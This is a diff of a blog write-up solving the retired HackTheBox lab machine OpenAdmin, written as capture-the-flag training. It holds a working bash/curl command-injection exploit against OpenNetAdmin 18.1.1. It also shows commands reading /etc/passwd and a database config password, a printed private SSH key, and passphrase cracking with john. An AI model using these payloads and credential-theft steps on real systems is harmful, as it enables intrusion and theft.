@@ -1,160 +1,116 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: OpenAdmin created by dmw0ng and publish on January 4, 2020. This box is classified as an easy machine. The user part is longer than the root part and involve to find a vulnerable component, exploit it to get a shell, found the creds of an user able to connect using SSH then found another webservice to get the private SSH key of a second user. The root part is simply exploiting a sudo permission on nano to execute command." />
-<meta name="keywords" content="security, boot2root, HTB, openAdmin, sudo, nano">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: OpenAdmin"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: OpenAdmin created by dmw0ng and publish on January 4, 2020. This box is classified as an easy machine. The user part is longer than the root part and involve to find a vulnerable component, exploit it to get a shell, found the creds of an user able to connect using SSH then found another webservice to get the private SSH key of a second user. The root part is simply exploiting a sudo permission on nano to execute command."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/05/htb-openadmin.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-05-04 14:09:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="openAdmin"/>
-  <meta property="article:tag" content="sudo"/>
-  <meta property="article:tag" content="nano"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: OpenAdmin</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: OpenAdmin created by dmw0ng and publish on January 4, 2020. This box is classified as an easy machine. The user part is longer than the root part and involve to find a vulnerable component, exploit it to get a shell, found the creds of an user able to connect using SSH then found another webservice to get the private SSH key of a second user. The root part is simply exploiting a sudo permission on nano to execute command." name="description"/>
+<meta content="security, boot2root, HTB, openAdmin, sudo, nano" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: OpenAdmin" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: OpenAdmin created by dmw0ng and publish on January 4, 2020. This box is classified as an easy machine. The user part is longer than the root part and involve to find a vulnerable component, exploit it to get a shell, found the creds of an user able to connect using SSH then found another webservice to get the private SSH key of a second user. The root part is simply exploiting a sudo permission on nano to execute command." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/05/htb-openadmin.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-05-04 14:09:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="openAdmin" property="article:tag"/>
+<meta content="sudo" property="article:tag"/>
+<meta content="nano" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: OpenAdmin</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-openadmin">HTB: OpenAdmin</h1>
-    <p>
+<header>
+<h1 id="htb-openadmin">HTB: OpenAdmin</h1>
+<p>
       Posted on 04 May 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 6 min read
+        • 6 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.05/openadmin_card.png" alt="OpenAdmin card" width="262"></p>
+</header>
+<div>
+<p><img alt="OpenAdmin card" class="align-left" src="/media/2020.05/openadmin_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/222">OpenAdmin</a> created by
 <a href="https://www.hackthebox.com/home/users/profile/82600">dmw0ng</a> and publish on
@@ -164,8 +120,6 @@ part and involve to find a vulnerable component, exploit it to get a shell,
 found the creds of an user able to connect using SSH then found another
 webservice to get the private SSH key of a second user.
 The root part is simply exploiting a sudo permission on <code>nano</code> to execute command.</p>
-
-
 <h1>User</h1>
 <h2>Recon</h2>
 <p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
@@ -179,10 +133,9 @@ PORT   STATE SERVICE
 
 # Nmap done at Tue Jan  7 04:23:21 2020 -- 1 IP address (1 host up) scanned in 1915.49 seconds
 </code></pre></div>
-
 <h2>Web</h2>
 <p>The landing page is the default Apache page.</p>
-<p><img alt="apache default page" src="/media/2020.05/openadmin_1.png"></p>
+<p><img alt="apache default page" class="image-process-article-image" src="/media/2020.05/derivatives/article-image/openadmin_1.png"/></p>
 <p>We run a dirb against it.</p>
 <div class="highlight"><pre><span></span><code>dirb http://10.10.10.171
 
@@ -205,13 +158,12 @@ GENERATED WORDS: 4612
 ==&gt; DIRECTORY: http://10.10.10.171/music/
 + http://10.10.10.171/server-status (CODE:403|SIZE:277)
 </code></pre></div>
-
 <p>The artwork directory is a rabbit hole (there is no dynamic code even for the
 contact page) but it was found first by dirb.</p>
-<p><img alt="Artwork page" src="/media/2020.05/openadmin_2.png"></p>
+<p><img alt="Artwork page" class="image-process-article-image" src="/media/2020.05/derivatives/article-image/openadmin_2.png"/></p>
 <p>The music directory offer a login page which redirect us to the ona webpage.</p>
-<p><img alt="Music page" src="/media/2020.05/openadmin_3.png"></p>
-<p><img alt="Music page" src="/media/2020.05/openadmin_4.png"></p>
+<p><img alt="Music page" class="image-process-article-image" src="/media/2020.05/derivatives/article-image/openadmin_3.png"/></p>
+<p><img alt="Music page" class="image-process-article-image" src="/media/2020.05/derivatives/article-image/openadmin_4.png"/></p>
 <h2>OpenAdmin</h2>
 <p>We can see on the ona (opennetadmin) that the version is the 18.1.1 which is not
 the latest. Using searchsploit we found a exploit for this specific version.</p>
@@ -224,20 +176,18 @@ OpenNetAdmin 13.03.01 - | exploits/php/webapps/26682.txt
 OpenNetAdmin 18.1.1 - R | exploits/php/webapps/47691.sh
 ------------------------ ------------------------------------
 </code></pre></div>
-
 <p>The script was not working out of the box for me so I "rewrote" it (it is a
 oneliner in bash).</p>
-<div class="highlight"><pre><span></span><code><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">&quot;</span>
-curl --silent -d <span class="s2">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;</span><span class="si">${</span><span class="nv">CMD</span><span class="si">}</span><span class="s2">;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="s2">&quot;http://10.10.10.171/ona/&quot;</span>  <span class="p">|</span> sed -n -e <span class="s1">&#39;/BEGIN/,/END/ p&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="nv">CMD</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">"</span>
+curl --silent -d <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";</span><span class="si">${</span><span class="nv">CMD</span><span class="si">}</span><span class="s2">;echo \"END\"&amp;xajaxargs[]=ping"</span> <span class="s2">"http://10.10.10.171/ona/"</span>  <span class="p">|</span> sed -n -e <span class="s1">'/BEGIN/,/END/ p'</span>
 </code></pre></div>
-
 <p>We start enumerating the box as <code>www-data</code>.</p>
-<div class="highlight"><pre><span></span><code>sh ona_rce.sh &#39;whoami&#39; 
-                  &lt;pre style=&quot;padding: 4px;font-family: monospace;&quot;&gt;BEGIN
+<div class="highlight"><pre><span></span><code>sh ona_rce.sh 'whoami' 
+                  &lt;pre style="padding: 4px;font-family: monospace;"&gt;BEGIN
   www-data
   END
-sh ona_rce.sh &#39;ls -al&#39;
-                &lt;pre style=&quot;padding: 4px;font-family: monospace;&quot;&gt;BEGIN
+sh ona_rce.sh 'ls -al'
+                &lt;pre style="padding: 4px;font-family: monospace;"&gt;BEGIN
 total 72
 drwxrwxr-x 10 www-data www-data 4096 Jan  7 14:41 .
 drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..
@@ -256,48 +206,46 @@ drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
 drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
 drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
 </code></pre></div>
-
 <p>We notice that the file are from January 2018. So we just filter on file older
 that 30 days. That allow us to find a configuration file for the database
 containing a password.</p>
-<div class="highlight"><pre><span></span><code>sh ona_rce.sh &#39;find ../../ -mtime -30 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;&#39;
-                &lt;pre style=&quot;padding: 4px;font-family: monospace;&quot;&gt;BEGIN
+<div class="highlight"><pre><span></span><code>sh ona_rce.sh 'find ../../ -mtime -30 2&gt;/dev/null | grep -Ev "^/proc"'
+                &lt;pre style="padding: 4px;font-family: monospace;"&gt;BEGIN
 ../../
 ../../priv.save
 ../../ona/www
 
 
-sh ona_rce.sh &#39;cat ../../ona/www/local/config/database_settings.inc.php&#39;
-                &lt;pre style=&quot;padding: 4px;font-family: monospace;&quot;&gt;BEGIN
+sh ona_rce.sh 'cat ../../ona/www/local/config/database_settings.inc.php'
+                &lt;pre style="padding: 4px;font-family: monospace;"&gt;BEGIN
 &lt;?php
 
 $ona_contexts=array (
-  &#39;DEFAULT&#39; =&gt;
+  'DEFAULT' =&gt;
   array (
-    &#39;databases&#39; =&gt;
+    'databases' =&gt;
     array (
       0 =&gt;
       array (
-        &#39;db_type&#39; =&gt; &#39;mysqli&#39;,
-        &#39;db_host&#39; =&gt; &#39;localhost&#39;,
-        &#39;db_login&#39; =&gt; &#39;ona_sys&#39;,
-        &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;,
-        &#39;db_database&#39; =&gt; &#39;ona_default&#39;,
-        &#39;db_debug&#39; =&gt; false,
+        'db_type' =&gt; 'mysqli',
+        'db_host' =&gt; 'localhost',
+        'db_login' =&gt; 'ona_sys',
+        'db_passwd' =&gt; 'n1nj4W4rri0R!',
+        'db_database' =&gt; 'ona_default',
+        'db_debug' =&gt; false,
       ),
     ),
-    &#39;description&#39; =&gt; &#39;Default data context&#39;,
-    &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;,
+    'description' =&gt; 'Default data context',
+    'context_color' =&gt; '#D3DBFF',
   ),
 );
 
 ?&gt;END
 </code></pre></div>
-
 <p>We want to try this password against SSH users but we don't know them. We can
 just cat <code>/etc/passwd</code> to get a list of the system's user.</p>
-<div class="highlight"><pre><span></span><code>sh ona_rce.sh &#39;cat /etc/passwd&#39;
-                &lt;pre style=&quot;padding: 4px;font-family: monospace;&quot;&gt;BEGIN
+<div class="highlight"><pre><span></span><code>sh ona_rce.sh 'cat /etc/passwd'
+                &lt;pre style="padding: 4px;font-family: monospace;"&gt;BEGIN
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -331,13 +279,11 @@ jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
 mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
 joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
 </code></pre></div>
-
 <p>I tried to logged as <code>joanna</code> first but the password was <code>jimmy</code>'s.</p>
 <div class="highlight"><pre><span></span><code>ssh jimmy@10.10.10.171
 jimmy@openadmin:~$ id
 uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
 </code></pre></div>
-
 <h2>Internal</h2>
 <p>We notice that we are part of the <code>internal</code> group. Therefore we look for files
 belonging to this specific group and found some "internal" directory containing
@@ -348,20 +294,18 @@ three PHP script.</p>
 /var/www/internal/logout.php
 /var/www/internal/index.php
 </code></pre></div>
-
 <p>main.php:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: /index.php&quot;</span><span class="p">);</span> <span class="p">};</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /index.php"</span><span class="p">);</span> <span class="p">};</span>
 <span class="c1"># Open Admin Trusted</span>
 <span class="c1"># OpenAdmin</span>
-<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class="p">);</span>
-<span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;</span><span class="si">$output</span><span class="s2">&lt;/pre&gt;&quot;</span><span class="p">;</span>
+<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cat /home/joanna/.ssh/id_rsa'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;pre&gt;</span><span class="si">$output</span><span class="s2">&lt;/pre&gt;"</span><span class="p">;</span>
 <span class="cp">?&gt;</span><span class="x"></span>
 <span class="x">&lt;html&gt;</span>
-<span class="x">&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;/h3&gt;</span>
-<span class="x">Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session</span>
+<span class="x">&lt;h3&gt;Don't forget your "ninja" password&lt;/h3&gt;</span>
+<span class="x">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session</span>
 <span class="x">&lt;/html&gt;</span>
 </code></pre></div>
-
 <p>index.php</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
   <span class="nb">ob_start</span><span class="p">();</span>
@@ -370,49 +314,49 @@ three PHP script.</p>
 
 <span class="cp">&lt;?</span>
   <span class="c1">// error_reporting(E_ALL);</span>
-  <span class="c1">// ini_set(&quot;display_errors&quot;, 1);</span>
+  <span class="c1">// ini_set("display_errors", 1);</span>
 <span class="cp">?&gt;</span><span class="x"></span>
 
-<span class="x">&lt;html lang = &quot;en&quot;&gt;</span>
+<span class="x">&lt;html lang = "en"&gt;</span>
 
 <span class="x">  &lt;head&gt;</span>
 <span class="x">      &lt;title&gt;Tutorialspoint.com&lt;/title&gt;</span>
-<span class="x">      &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt;</span>
+<span class="x">      &lt;link href = "css/bootstrap.min.css" rel = "stylesheet"&gt;</span>
 
 <span class="x">&lt;SNIP&gt;</span>
 <span class="x">  &lt;/head&gt;</span>
 <span class="x">  &lt;body&gt;</span>
 
 <span class="x">      &lt;h2&gt;Enter Username and Password&lt;/h2&gt;</span>
-<span class="x">      &lt;div class = &quot;container form-signin&quot;&gt;</span>
-<span class="x">        &lt;h2 class=&quot;featurette-heading&quot;&gt;Login Restricted.&lt;span class=&quot;text-muted&quot;&gt;&lt;/span&gt;&lt;/h2&gt;</span>
+<span class="x">      &lt;div class = "container form-signin"&gt;</span>
+<span class="x">        &lt;h2 class="featurette-heading"&gt;Login Restricted.&lt;span class="text-muted"&gt;&lt;/span&gt;&lt;/h2&gt;</span>
 <span class="x">          </span><span class="cp">&lt;?php</span>
-            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
 
-            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
-              <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;jimmy&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">&#39;sha512&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;</span><span class="p">)</span> <span class="p">{</span>
-                  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;jimmy&#39;</span><span class="p">;</span>
-                  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: /main.php&quot;</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+              <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'jimmy'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha512'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="s1">'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'</span><span class="p">)</span> <span class="p">{</span>
+                  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'jimmy'</span><span class="p">;</span>
+                  <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /main.php"</span><span class="p">);</span>
               <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                  <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;Wrong username or password.&#39;</span><span class="p">;</span>
+                  <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">'Wrong username or password.'</span><span class="p">;</span>
               <span class="p">}</span>
             <span class="p">}</span>
         <span class="cp">?&gt;</span><span class="x"></span>
 <span class="x">      &lt;/div&gt; &lt;!-- /container --&gt;</span>
 
-<span class="x">      &lt;div class = &quot;container&quot;&gt;</span>
+<span class="x">      &lt;div class = "container"&gt;</span>
 
-<span class="x">        &lt;form class = &quot;form-signin&quot; role = &quot;form&quot;</span>
-<span class="x">            action = &quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]);</span>
-            <span class="cp">?&gt;</span><span class="x">&quot; method = &quot;post&quot;&gt;</span>
-<span class="x">            &lt;h4 class = &quot;form-signin-heading&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&lt;/h4&gt;</span>
-<span class="x">            &lt;input type = &quot;text&quot; class = &quot;form-control&quot;</span>
-<span class="x">              name = &quot;username&quot;</span>
+<span class="x">        &lt;form class = "form-signin" role = "form"</span>
+<span class="x">            action = "</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">]);</span>
+            <span class="cp">?&gt;</span><span class="x">" method = "post"&gt;</span>
+<span class="x">            &lt;h4 class = "form-signin-heading"&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&lt;/h4&gt;</span>
+<span class="x">            &lt;input type = "text" class = "form-control"</span>
+<span class="x">              name = "username"</span>
 <span class="x">              required autofocus&gt;&lt;/br&gt;</span>
-<span class="x">            &lt;input type = &quot;password&quot; class = &quot;form-control&quot;</span>
-<span class="x">              name = &quot;password&quot; required&gt;</span>
-<span class="x">            &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot;</span>
-<span class="x">              name = &quot;login&quot;&gt;Login&lt;/button&gt;</span>
+<span class="x">            &lt;input type = "password" class = "form-control"</span>
+<span class="x">              name = "password" required&gt;</span>
+<span class="x">            &lt;button class = "btn btn-lg btn-primary btn-block" type = "submit"</span>
+<span class="x">              name = "login"&gt;Login&lt;/button&gt;</span>
 <span class="x">        &lt;/form&gt;</span>
 
 <span class="x">      &lt;/div&gt;</span>
@@ -420,7 +364,6 @@ three PHP script.</p>
 <span class="x">  &lt;/body&gt;</span>
 <span class="x">&lt;/html&gt;</span>
 </code></pre></div>
-
 <p>We can see that the <code>main.php</code> script just print <code>joanna</code>'s private SSH key. And
 the script is only checking if the <code>username</code> parameter is set. But we are
 unable to access the site. We check the Apache configuration to see that the
@@ -441,15 +384,13 @@ AssignUserID joanna joanna
 
 &lt;/VirtualHost&gt;
 </code></pre></div>
-
 <p>We rewrote <code>main.php</code> in order to suppress the parameter check:</p>
 <div class="highlight"><pre><span></span><code>jimmy@openadmin:/var/www/internal$ cat main.php
 &lt;?php
-$output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;);
-echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "&lt;pre&gt;$output&lt;/pre&gt;";
 ?&gt;
 </code></pre></div>
-
 <p>And we call the page and get <code>joanna's</code> private SSH key.</p>
 <div class="highlight"><pre><span></span><code>jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
 &lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
@@ -483,14 +424,13 @@ z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
 K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 -----END RSA PRIVATE KEY-----
 </code></pre></div>
-
 <p>We see that the key is password protected (second line of the key) so we use
 <code>ssh2john</code> to convert the key to a crackable hash. Then we run john on it using
 the rockyou wordlist. We crack the <code>bloodninjas</code> password.</p>
 <div class="highlight"><pre><span></span><code>$ python2 /usr/bin/ssh2john id_rsa &gt; id_rsa.hash
 $ john id_rsa.hash -w=tools/password_lists/rockyou.txt
-Warning: detected hash type &quot;SSH&quot;, but the string is also recognized as &quot;ssh-opencl&quot;
-Use the &quot;--format=ssh-opencl&quot; option to force loading these as that type instead
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
